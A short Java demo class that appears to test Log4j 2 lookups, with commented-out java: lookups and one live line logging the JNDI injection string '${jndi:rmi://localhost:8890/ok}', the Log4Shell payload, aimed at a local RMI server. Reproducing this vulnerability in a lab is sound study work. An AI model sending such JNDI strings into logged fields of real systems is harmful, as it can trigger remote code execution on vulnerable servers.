import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

public class Demo {
    public static void main(String[] args) {
        Logger logger = LogManager.getLogger();
//        https://logging.apache.org/log4j/2.x/manual/lookups
//        logger.error("hello: {}","${java:version}");
//        logger.error("hello: {}","${java:runtime}");
//        logger.error("hello: {}","${java:vm}");
//        logger.error("hello: {}","${java:locale}");
//        logger.error("hello: {}","${java:hw}");
        logger.error("hello: {}","${jndi:rmi://localhost:8890/ok}");
    }
}
